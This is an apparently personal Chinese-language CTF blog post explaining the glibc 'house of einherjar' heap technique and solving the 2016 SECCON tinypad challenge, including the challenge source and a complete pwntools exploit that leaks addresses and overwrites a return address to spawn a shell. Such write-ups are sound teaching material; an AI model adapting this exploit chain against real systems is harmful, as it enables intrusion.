@@ -1,0 +1,427 @@
+<!DOCTYPE html><html class="appearance-auto" lang="zh-cn"><head><meta charset="UTF-8"><title>DATAL's blog</title><meta name="description" content="my blogs about pwn"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
+<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/favicon.ico"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="house of einherjar介绍house of einherjar 是一种堆利用技术，由 Hiroki Matsukuma 提出，该堆利用技术可以强制使得 malloc 返回一个几乎任意地址的 chunk 。其主要在于滥用 free 中的后向合并操作（合并低地址的chunk），从而使得尽可能避免碎片化。
+此外，需要注意的是，在一些特殊大小的堆块中，off by one 不仅可以修改下一个堆块的 prev_size，还可以修改下一个堆块的 PREV_INUSE 比特位。
+
+在《CTF竞赛权威指南》中将该技术归类到了off-by-one中，但是在CTF wiki并没有归类到一起，我比较赞同wiki的分类。因为在这里只是利用了share chunk原理，将next chunk的prev_size覆盖，程.."><meta name="generator" content="Hexo 6.3.0"></head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">DATAL's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center"></p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">点击返回顶部</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">首页</a></h3><h3 class="is-inline-block"><a href="/about">关于</a></h3><h3 class="is-inline-block"><a href="/archives">归档</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">首页</a></h3><h3 class="is-inline-block"><a href="/about">关于</a></h3><h3 class="is-inline-block"><a href="/archives">归档</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-einherjar"><span class="toc-text">house of einherjar</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E5%90%91%E5%90%88%E5%B9%B6%E6%93%8D%E4%BD%9C"><span class="toc-text">后向合并操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#chunk%E5%A4%8D%E7%94%A8"><span class="toc-text">chunk复用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E5%88%A9%E7%94%A8"><span class="toc-text">具体利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2016-Seccon-tinypad"><span class="toc-text">2016 Seccon tinypad</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD%E5%88%86%E6%9E%90"><span class="toc-text">基本功能分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81"><span class="toc-text">代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E8%BF%87%E7%A8%8B"><span class="toc-text">具体过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li></ol></li></ol></li></ol></div><div class="column is-9"><header class="my-4"></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle"></h1><time class="has-text-grey" datetime="2023-05-29T08:57:55.196Z">2023-05-29</time><article class="mt-2 post-content"><h1 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>house of einherjar 是一种堆利用技术，由 Hiroki Matsukuma 提出，该堆利用技术可以强制使得 malloc 返回一个几乎任意地址的 chunk 。其主要在于滥用 free 中的后向合并操作（合并低地址的chunk），从而使得尽可能避免碎片化。</p>
+<p>此外，需要注意的是，在一些特殊大小的堆块中，off by one 不仅可以修改下一个堆块的 prev_size，还可以修改下一个堆块的 PREV_INUSE 比特位。</p>
+<hr>
+<p>在《CTF竞赛权威指南》中将该技术归类到了off-by-one中，但是在CTF wiki并没有归类到一起，我比较赞同wiki的分类。因为在这里只是利用了share chunk原理，将next chunk的prev_size覆盖，程序中有无溢出并无关系，相反，如果存在null byte溢出，更改了next chunk的size大小，甚至还会出现麻烦，所以如果你和我一样是看这本书学习的话，不要被书上的分类误导。</p>
+<hr>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>主要利用两个点，一个是free的unlink，另外一个是chunk复用。</p>
+<h3 id="后向合并操作"><a href="#后向合并操作" class="headerlink" title="后向合并操作"></a>后向合并操作</h3><p>free 函数中的后向合并核心操作如下：</p>
+<pre><code class="c_cpp">  /* consolidate backward */
+  if (!prev_inuse(p)) &#123;
+      prevsize = prev_size(p);
+      size += prevsize;
+      p = chunk_at_offset(p, -((long) prevsize));
+      unlink(av, p, bck, fwd);
+  &#125;
+</code></pre>
+<p>在free中规定的合并顺序是先向后（也就是向低地址，上一个chunk的位置），再向前（next chunk）。</p>
+<h3 id="chunk复用"><a href="#chunk复用" class="headerlink" title="chunk复用"></a>chunk复用</h3><p>   当前一个chunk申请的数据空间申请的大小对16取余后，如果多出来的大小小于等于8字节，那么这个多出来的大小就放入下一个chunk的prev_size中存储。在上一篇的off-by-one也讲到了这点，不再赘述。</p>
+<h3 id="具体利用"><a href="#具体利用" class="headerlink" title="具体利用"></a>具体利用</h3><p>如下图所示，存在prev和p两个chunk，其中红框内的（prev_size）属于共享字段，所以我们填充prev的数据时可以覆盖掉p的prev_size字段，而向后合并时，寻找上一个chunk便需要通过本chunk的地址减去prev_size，也就是新chunk的地址取决于<code>chunk_at_offset(p, -((long)  prevsize))</code>。</p>
+<p><img src="https://fastly.jsdelivr.net/gh/DETALA/images@main/pwn/malloc&free/16853500777080ae907ddcecfc4cb714c653555c36424.png"></p>
+<p>此外，也要考虑一下unlink的检查机制，通过prev_size寻找的fake chunk需要设置相同大小的size，否则就会报错**”corrupted size vs. prev_size”**。</p>
+<pre><code class="c_cpp">if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      
+      malloc_printerr (&quot;corrupted size vs. prev_size&quot;);
+</code></pre>
+<p>我们的目的是造成overlap，以获取某块地址的控制权，那么这里fake chunk地址的选取就很关键了，这里介绍一种题目常用的方式，在stack中构造fake chunk，如下图所示。</p>
+<p><img src="https://fastly.jsdelivr.net/gh/DETALA/images@main/pwn/malloc&free/1685350117704f9c0aa40636c72513fc03c823ea2a4a6.png"></p>
+<p>可以看到我们在stack上构造了一个大小为size为0xffff800000604550的fake chunk，chunk b的prev_size也被覆盖了同样的大小，该大小是通过<code>chunk b_addr-prev_size =fake chunk_addr</code> 计算得来，在该例中，<strong>0x602020-0x7fffffffdad0 &#x3D; 0xffff800000604550</strong>。</p>
+<p>在该过程中，chunk b向后合并，与fake chunk合并后，再向下合并，与top chunk相邻近，所以，fake chunk就变成了新的top chunk，在堆中不存在其他空闲chunk时，只要通过brk方式产生新heap，那么肯定是从fake chunk的地方分配，这意味着我们获得了从fake chunk地址+0x10开始之后一定空间的控制权（不大于brk方式的最大值）。</p>
+<h2 id="2016-Seccon-tinypad"><a href="#2016-Seccon-tinypad" class="headerlink" title="2016 Seccon tinypad"></a>2016 Seccon tinypad</h2><h3 id="基本功能分析"><a href="#基本功能分析" class="headerlink" title="基本功能分析"></a>基本功能分析</h3><p>首先，程序有一个核心的读取函数，即读取指定长度字节的字符串，然而，当读取的长度恰好为指定的长度时，会出现<strong>off by one</strong> 的漏洞。</p>
+<pre><code class="c_cpp">unsigned __int64 __fastcall read_until(char *a1, unsigned __int64 len, int terminate)
+&#123;
+  unsigned __int64 i; // [rsp+28h] [rbp-18h]
+  __int64 n; // [rsp+30h] [rbp-10h]
+
+  for ( i = 0LL; i &lt; len; ++i )
+  &#123;
+    n = read_n(0, (__int64)&amp;a1[i], 1uLL);
+    if ( n &lt; 0 )
+      return -1LL;
+    if ( !n || a1[i] == terminate )
+      break;
+  &#125;
+  a1[i] = 0;  //bull byte off-by-one
+  if ( i == len &amp;&amp; a1[len - 1] != &#39;\n&#39; )
+    dummyinput(terminate);
+  return i;
+&#125;
+</code></pre>
+<p>通过分析程序，我们不难看出，这个程序的基本功能是操作一个 tinypad，主要有以下操作</p>
+<ul>
+<li>开头，程序每次开头依次判断每个 memo 的指针来判断是否为空，如果不为空，进而利用 strlen 求得其相应的长度，将 memo 的内容输出。从这里，我们也可以看出最多有 4 个 memo。</li>
+<li>添加 memo，遍历存储 memo 的变量tinypad，根据 tinypad 的存储的大小判断 memo 是否在使用，然后还有的话，分配一个 memo。从这里我们可以知道，程序只是从 tinypad 起始偏移16*16&#x3D;256 处才开始使用，每个 memo 存储两个字段，一个是该 memo 的大小，另一个是该 memo 对应的指针。所以我们可以创建一个新的结构体，并修改 ida 识别的 tinypad，使之更加可读（但是其实 ida 没有办法帮忙智能识别。）。同时，由于该添加功能依赖于读取函数，所以存在 off by one 的漏洞。此外，我们可以看出，用户申请的 chunk 的大小最大为 256 字节，和 tinypad 前面的未使用的 256 字节恰好一致。</li>
+<li>删除，根据存储 memo 的大小判断 memo 是否在被使用，同时将相应 memo 大小设置为0，但是并没有将指针设置为 NULL，有可能会导致 Use After Free。即在程序开头时，就有可能输出一些相关的内容，这其实就是我们泄漏一些基地址的基础。</li>
+<li>编辑。在编辑时，程序首先根据之前存储的 memo 的内容将其拷贝到 tinypad 的前 256 个字节中（buffer），但正如我们之前所说的，当 memo 存储了 256 个字节时，就会存在 off by one漏洞。与此同时，程序利用 strlen 判断复制之后的 tinypad 的内容长度，并将其输出。之后程序继续利用 strlen 求得 memo 的长度，并读取指定长度内容到 tinypad 中，根据读取函数，这里必然出现了 \x00。最后程序将读取到 tinypad 前 256 字节的内容放到对应 memo 中。</li>
+</ul>
+<p>主要的数据结构有：</p>
+<pre><code class="c_cpp">struct &#123;
+    char buffer[0x100]; // make a fakechunk.
+    struct &#123;
+        size_t size;
+        char *memo;
+    &#125; page[4];
+&#125; tinypad;
+</code></pre>
+<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>这里只是附上源代码方便理解，按常理来说应该只能对可执行程序进行ida反汇编，详细的文件可以在CTF wiki的house of einherjar查看下载。</p>
+<pre><code class="c_cpp">#include &lt;ctype.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &quot;pwnio.h&quot;
+
+#define PADSIZE         0x4
+const char title[] = &quot;  ============================================================================\n&quot;
+                     &quot;// _|_|_|_|_|  _|_|_|  _|      _|  _|      _|  _|_|_|      _|_|    _|_|_|     \\\\\n&quot;
+                     &quot;||     _|        _|    _|_|    _|    _|  _|    _|    _|  _|    _|  _|    _|   ||\n&quot;
+                     &quot;||     _|        _|    _|  _|  _|      _|      _|_|_|    _|_|_|_|  _|    _|   ||\n&quot;
+                     &quot;||     _|        _|    _|    _|_|      _|      _|        _|    _|  _|    _|   ||\n&quot;
+                     &quot;\\\\     _|      _|_|_|  _|      _|      _|      _|        _|    _|  _|_|_|     //\n&quot;
+                     &quot;  ============================================================================\n&quot;;
+const char separator[] = &quot;+------------------------------------------------------------------------------+\n&quot;;
+const char menu[] = &quot;+- MENU -----------------------------------------------------------------------+\n&quot;
+                    &quot;| [A] Add memo                                                                 |\n&quot;
+                    &quot;| [D] Delete memo                                                              |\n&quot;
+                    &quot;| [E] Edit memo                                                                |\n&quot;
+                    &quot;| [Q] Quit                                                                     |\n&quot;
+                    &quot;+------------------------------------------------------------------------------+\n&quot;;
+
+const char show_index[] = &quot; #   INDEX: &quot;;
+const char show_content[] = &quot; # CONTENT: &quot;;
+const char confirm_content[] = &quot;CONTENT: &quot;;
+
+const char prompt_cmd[] = &quot;(CMD)&gt;&gt;&gt; &quot;;
+const char prompt_size[] = &quot;(SIZE)&gt;&gt;&gt; &quot;;
+const char prompt_content[] = &quot;(CONTENT)&gt;&gt;&gt; &quot;;
+const char prompt_index[] = &quot;(INDEX)&gt;&gt;&gt; &quot;;
+const char prompt_confirm[] = &quot;(Y/n)&gt;&gt;&gt; &quot;;
+
+const char errmsg_no_space_left[] = &quot;No space is left.&quot;;
+const char errmsg_no_such_command[] = &quot;No such a command&quot;;
+const char errmsg_invalid_index[] = &quot;Invalid index&quot;;
+const char errmsg_not_used[] = &quot;Not used&quot;;
+
+const char syserr_no_memory_is_available[] = &quot;[!] No memory is available.&quot;;
+const char syserr_init_failed[] = &quot;[!] Init failed.&quot;;
+const char msg_confirm[] = &quot;Is it OK?&quot;;
+const char msg_timeout[] = &quot;Timeout.&quot;;
+
+const size_t memo_maxlen = 0x100;
+struct &#123;
+    char buffer[0x100]; // make a fakechunk.
+    struct &#123;
+        size_t size;
+        char *memo;
+    &#125; page[4];
+&#125; tinypad;
+
+static inline void dummyinput(int c)
+&#123;
+    if(!c) return;
+    char dummy = &#39;\0&#39;;
+    while(dummy != c) 
+        read_n(&amp;dummy, 1);
+&#125;
+
+
+int getcmd()
+&#123;
+    int cmd = &#39;\0&#39;;
+
+    write_n(menu, strlen(menu));
+
+    write_n(prompt_cmd, strlen(prompt_cmd)); 
+    read_until((char *)&amp;cmd, 1, &#39;\n&#39;);
+    write_n(&quot;\n&quot;, 1);
+
+    return toupper(cmd);
+&#125;
+
+int main()
+&#123;
+    int cmd = &#39;\0&#39;;
+
+    write_n(&quot;\n&quot;, 1);
+    write_n(title, strlen(title));
+    write_n(&quot;\n&quot;, 1);
+    do&#123;
+        for(int i = 0; i &lt; PADSIZE; i++) &#123;
+            char count = &#39;1&#39;+i;
+            writeln(separator, strlen(separator));
+
+            write_n(show_index, strlen(show_index)); writeln(&amp;count, 1);
+            write_n(show_content, strlen(show_content));
+            if(tinypad.page[i].memo) &#123;
+                writeln(tinypad.page[i].memo, strlen(tinypad.page[i].memo));
+            &#125;
+            writeln(&quot;\n&quot;, 1);
+        &#125;
+        int idx = 0;
+        switch(cmd = getcmd()) &#123;
+            case &#39;A&#39;: &#123;
+                    while(idx &lt; PADSIZE &amp;&amp; tinypad.page[idx].size != 0) idx++;
+                    if(idx == PADSIZE) &#123;
+                        writeln(errmsg_no_space_left, strlen(errmsg_no_space_left));
+                        break;
+                    &#125;
+                    int size = -1;
+                    write_n(prompt_size, strlen(prompt_size)); 
+                    size = read_int();
+                    size =  (size &lt;    0x1)? 0x1:
+                            (size &lt;  memo_maxlen)? size: memo_maxlen;
+                    tinypad.page[idx].size = size;
+
+                    if((tinypad.page[idx].memo = malloc(size)) == NULL) &#123;
+                        writerrln(&quot;[!] No memory is available.&quot;, strlen(&quot;[!] No memory is available.&quot;));
+                        _exit(-1);
+                    &#125;
+
+                    write_n(prompt_content, strlen(prompt_content));
+                    read_until(tinypad.page[idx].memo, size, &#39;\n&#39;);
+                    writeln(&quot;\nAdded.&quot;, strlen(&quot;\nAdded.&quot;));
+                &#125; break;
+            case &#39;D&#39;: &#123;
+                    write_n(prompt_index, strlen(prompt_index));
+                    idx = read_int();
+                    if(!(0 &lt; idx &amp;&amp; idx &lt;= PADSIZE)) &#123;
+                        writeln(errmsg_invalid_index, strlen(errmsg_invalid_index));
+                        break;
+                    &#125;
+                    if(tinypad.page[idx-1].size == 0) &#123;
+                        writeln(errmsg_not_used, strlen(errmsg_not_used));
+                        break;
+                    &#125;
+
+                    // XXX: UAF
+                    free(tinypad.page[idx-1].memo);
+                    tinypad.page[idx-1].size = 0;
+
+                    writeln(&quot;\nDeleted.&quot;, strlen(&quot;\nDeleted.&quot;));
+                &#125; break;
+            case &#39;E&#39;: &#123;
+                    write_n(prompt_index, strlen(prompt_index));
+                    idx = read_int();
+                    if(!(0 &lt; idx &amp;&amp; idx &lt;= PADSIZE)) &#123;
+                        writeln(errmsg_invalid_index, strlen(errmsg_invalid_index));
+                        break;
+                    &#125;
+                    if(tinypad.page[idx-1].size == 0) &#123;
+                        writeln(errmsg_not_used, strlen(errmsg_not_used));
+                        break;
+                    &#125;
+
+                    int confirmation = &#39;0&#39;;
+                    strcpy(tinypad.buffer, tinypad.page[idx-1].memo);
+                    while(toupper(confirmation) != &#39;Y&#39;) &#123;
+                        write_n(confirm_content, strlen(confirm_content));
+                        writeln(tinypad.buffer, strlen(tinypad.buffer));
+                        write_n(prompt_content, strlen(prompt_content));
+                        // XXX: Not NUL Terminated.
+                        read_until(tinypad.buffer, strlen(tinypad.page[idx-1].memo), &#39;\n&#39;);
+                        writeln(msg_confirm, strlen(msg_confirm));
+                        write_n(prompt_confirm, strlen(prompt_confirm));
+                        read_until((char *)&amp;confirmation, 1, &#39;\n&#39;);
+                    &#125;
+                    strcpy(tinypad.page[idx-1].memo, tinypad.buffer);
+
+                    writeln(&quot;\nEdited.&quot;, strlen(&quot;\nEdited.&quot;));
+                &#125; break;
+            default:
+                writeln(errmsg_no_such_command, strlen(errmsg_no_such_command));
+            case &#39;Q&#39;:
+                break;
+        &#125;
+    &#125; while(cmd != &#39;Q&#39;);
+
+    return 0;
+&#125;
+</code></pre>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>首先程序存在两个漏洞：<strong>UAF</strong>和<strong>house of einherjar</strong>。</p>
+<p>程序增删改通过info-&gt;size 判断是否存在，而<strong>查</strong>通过info-&gt;data，且Delete只删除size，不删除data，所以被释放的memo内容仍会被打印，导致信息泄露。</p>
+<p>主要思路如下：</p>
+<ol>
+<li>信息泄露：通过UAF泄露堆地址和libc的基地址，比如这里free两个chunk，A和B，A的fd会存放B的地址，即堆地址，B的fd会存放small bin的地址，即为libc地址。</li>
+<li>利用house of einherjar在tinypad的buffer伪造chunk，以获取buffer后四个memo数组的指针和内容。</li>
+<li>这时就可以考虑如何处罚one_gadget，这题开启了full relro保护，所以无法修改GOT表；那么就考虑malloc_hook，这题的edit修改会首先通过strcpy复制原内容到buffer，然后strlen判断原长度以进行再次编辑，malloc_hook初始时为0，行不通。这里考虑修改程序的main函数返回地址为OGG，直接就需要一个stack地址了，而_environ全局变量保存了一个指向栈的地址，而environ会在libc中导出，第一步中已经知道了libc基地址，所以就之后就顺理成章了。</li>
+</ol>
+<h3 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h3><ol>
+<li>泄露信息</li>
+</ol>
+<pre><code class="python">def leak_heap_libc():
+    global heap_base, libc_base
+
+    add(0xe0, &quot;A&quot; * 0x10) #A
+    add(0xf0, &quot;A&quot; * 0xf0) #B
+    add(0x100, &quot;A&quot; * 0x10) #C
+    add(0x100, &quot;A&quot; * 0x10) #D
+
+    delete(3)
+    delete(1)
+
+    io.recvuntil(&quot;INDEX: 1\n # CONTENT: &quot;)
+    heap_base = u64(io.recvn(4).ljust(8, b&quot;\x00&quot;)) - (0x100 + 0xf0)
+    log.info(&quot;heap base: 0x%x&quot; % heap_base)
+
+    io.recvuntil(&quot;INDEX: 3\n # CONTENT: &quot;)
+    libc_base = u64(io.recvn(6).ljust(8, b&quot;\x00&quot;)) - 0x3c4b78
+    log.info(&quot;libc base: 0x%x&quot; % libc_base)
+</code></pre>
+<p>如下图所示，此时freeA和C，A中的fd为0xe581f0——chunk C的地址，C的fd为0x7fef7a849b78，为libc</p>
+<p><img src="https://fastly.jsdelivr.net/gh/DETALA/images@main/pwn/malloc&free/1685350151706aec114119eb1900a23b37fce07429a40.png"></p>
+<ol start="2">
+<li>house of einherjar</li>
+</ol>
+<pre><code class="python">def house_of_einherjar():
+    delete(4)                                # move top chunk
+
+    fake_chunk1  = b&quot;A&quot; * 0xe0
+
+    fake_chunk1 += p64(heap_base + 0xf0 -tinypad)    # prev_size
+    add(0xe8, fake_chunk1)                    # null byte overflow
+
+    fake_chunk2  = p64(0x100)                        # prev_size
+    fake_chunk2 += p64(heap_base + 0xf0 - tinypad)    # size
+    fake_chunk2 += p64(0x602040) * 4                # fd, bk
+    edit(2, fake_chunk2)
+
+    delete(2)                                # consolidate
+</code></pre>
+<p>上述操作将B的prev_size覆盖为(heap_base + 0xf0 -tinypad)，之后再将其free后，变进行unlink，先和fake chunk，后和top chunk。</p>
+<p>其中此时(heap_base + 0xf0 -tinypad) &#x3D; 0x13b7fc1，可以看到在tinypad构造的fake chunk中的size也为该大小。</p>
+<p>此时fake chunk成为了new top chunk。</p>
+<p><img src="https://fastly.jsdelivr.net/gh/DETALA/images@main/pwn/malloc&free/16853501812894dcfd61d6a6f2a43f7a3899b67bdf7fd.png"></p>
+<ol start="3">
+<li>泄露stack</li>
+</ol>
+<pre><code class="python">def leak_stack():
+    global stack_addr
+
+    environ_addr = libc_base + libc.symbols[&quot;__environ&quot;]
+    payload  = p64(0xe8) + p64(environ_addr)        # tinypad1
+    payload += p64(0xe8) + p64(tinypad + 0x108)    # tinypad2
+    add(0xe0, &quot;A&quot; * 0xe0)
+    add(0xe0, payload)
+
+    io.recvuntil(&quot;INDEX: 1\n # CONTENT: &quot;)
+    stack_addr = u64(io.recvn(6).ljust(8, b&quot;\x00&quot;))
+    log.info(&quot;stack address: 0x%x&quot; % stack_addr)
+</code></pre>
+<p>这里申请两个chunk，第二个chunk覆盖了page[4]数组的空间，放入伪造的tinypad1和tinypad2，分别放如environ和tinypad+0x108的地址,（tinypad+0x108&#x3D;0x602148)指向tinypad1的memo指针，也就是这里存放environ地址的地方，回想一下tinypad的struct。</p>
+<p><img src="https://fastly.jsdelivr.net/gh/DETALA/images@main/pwn/malloc&free/1685350202998e92ca21dc1883467cc342b6d59c3eb37.png"></p>
+<ol start="4">
+<li>修改返回地址</li>
+</ol>
+<pre><code class="python">def pwn():
+    one_gadget = libc_base + 0x45216
+
+    edit(2, p64(stack_addr - 0xf0))            # return address
+    edit(1, p64(one_gadget))
+
+    io.sendlineafter(&quot;(CMD)&gt;&gt;&gt; &quot;, &#39;Q&#39;)
+    io.interactive()
+</code></pre>
+<p><code>edit(2, p64(stack_addr - 0xf0))</code>，程序会找到指向memo内容的指针，也就是这里伪造的environ地址，并且修改内容为返回地址。</p>
+<p><code>edit(1, p64(one_gadget))</code>，此时，page[0]，也就是我们伪造的tinypad1，原本存放的environ地址已经被上一句命令改为返回地址，所以该命令会取出返回地址，放入我们的one_gadget，之后退出即可触发。</p>
+<p><img src="https://fastly.jsdelivr.net/gh/DETALA/images@main/pwn/malloc&free/1685350221906f4a2ca754e593ce44d51e5062855a87e.png"></p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
+io = process(&#39;./tinypad&#39;)
+libc = ELF(&#39;libc.so.6&#39;)
+
+tinypad = 0x602040
+
+def add(size, content):
+    io.sendlineafter(&quot;(CMD)&gt;&gt;&gt; &quot;, &#39;A&#39;)
+    io.sendlineafter(&quot;(SIZE)&gt;&gt;&gt; &quot;, str(size))
+    io.sendlineafter(&quot;(CONTENT)&gt;&gt;&gt; &quot;, content)
+
+def delete(idx):
+    io.sendlineafter(&quot;(CMD)&gt;&gt;&gt; &quot;, &#39;D&#39;)
+    io.sendlineafter(&quot;(INDEX)&gt;&gt;&gt; &quot;, str(idx))
+
+def edit(idx, content):
+    io.sendlineafter(&quot;(CMD)&gt;&gt;&gt; &quot;, &#39;E&#39;)
+    io.sendlineafter(&quot;(INDEX)&gt;&gt;&gt; &quot;, str(idx))
+    io.sendlineafter(&quot;(CONTENT)&gt;&gt;&gt; &quot;, content)
+    io.sendlineafter(&quot;(Y/n)&gt;&gt;&gt; &quot;, &#39;Y&#39;)
+
+def leak_heap_libc():
+    global heap_base, libc_base
+
+    add(0xe0, &quot;A&quot; * 0x10)
+    add(0xf0, &quot;A&quot; * 0xf0)
+    add(0x100, &quot;A&quot; * 0x10)
+    add(0x100, &quot;A&quot; * 0x10)
+
+    delete(3)
+    delete(1)
+
+    io.recvuntil(&quot;INDEX: 1\n # CONTENT: &quot;)
+    heap_base = u64(io.recvn(4).ljust(8, b&quot;\x00&quot;)) - (0x100 + 0xf0)
+    log.info(&quot;heap base: 0x%x&quot; % heap_base)
+
+    io.recvuntil(&quot;INDEX: 3\n # CONTENT: &quot;)
+    libc_base = u64(io.recvn(6).ljust(8, b&quot;\x00&quot;)) - 0x3c4b78
+    log.info(&quot;libc base: 0x%x&quot; % libc_base)
+
+def house_of_einherjar():
+    delete(4)                                # move top chunk
+
+    fake_chunk1  = b&quot;A&quot; * 0xe0
+
+    fake_chunk1 += p64(heap_base + 0xf0 -tinypad)    # prev_size
+    add(0xe8, fake_chunk1)                    # null byte overflow
+
+    fake_chunk2  = p64(0x100)                        # prev_size
+    fake_chunk2 += p64(heap_base + 0xf0 - tinypad)    # size
+    fake_chunk2 += p64(0x602040) * 4                # fd, bk
+    edit(2, fake_chunk2)
+
+    delete(2)                                # consolidate
+
+def leak_stack():
+    global stack_addr
+
+    environ_addr = libc_base + libc.symbols[&quot;__environ&quot;]
+    payload  = p64(0xe8) + p64(environ_addr)        # tinypad1
+    payload += p64(0xe8) + p64(tinypad + 0x108)    # tinypad2
+    add(0xe0, &quot;A&quot; * 0xe0)
+    add(0xe0, payload)
+
+    io.recvuntil(&quot;INDEX: 1\n # CONTENT: &quot;)
+    stack_addr = u64(io.recvn(6).ljust(8, b&quot;\x00&quot;))
+    log.info(&quot;stack address: 0x%x&quot; % stack_addr)
+
+def pwn():
+    one_gadget = libc_base + 0x45216
+
+    edit(2, p64(stack_addr - 0xf0))            # return address
+    edit(1, p64(one_gadget))
+
+    io.sendlineafter(&quot;(CMD)&gt;&gt;&gt; &quot;, &#39;Q&#39;)
+    io.interactive()
+&quot;&quot;&quot;
+0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
+constraints:
+  rax == NULL
+
+0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
+constraints:
+  [rsp+0x30] == NULL
+
+0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)
+constraints:
+  [rsp+0x50] == NULL
+
+0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)
+constraints:
+&quot;&quot;&quot;
+leak_heap_libc()
+house_of_einherjar()
+leak_stack()
+pwn()
+</code></pre>
+</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2023/05/29/CTF_off-By-One/" title=""><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">上一页: </span></a><a class="button is-default" href="/2023/05/13/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90_free/" title=""><span class="has-text-weight-semibold">下一页: </span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="DETALA/DETALA.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><a title="twitter" target="_blank" rel="noopener nofollow" href="//twitter.com//"><i class="iconfont icon-twitter"></i></a><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/DETALA"><i class="iconfont icon-github"></i></a><!-- Ins--><a title="instagram" target="_blank" rel="noopener nofollow" href="//www.instagram.com//"><i class="iconfont icon-ins"></i></a><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--><a title="facebook" target="_blank" rel="noopener nofollow" href="//www.facebook.com//"><i class="iconfont icon-tian7_facebook"></i></a></section><p><span>Copyright ©</span><span> DATAL 2023</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>
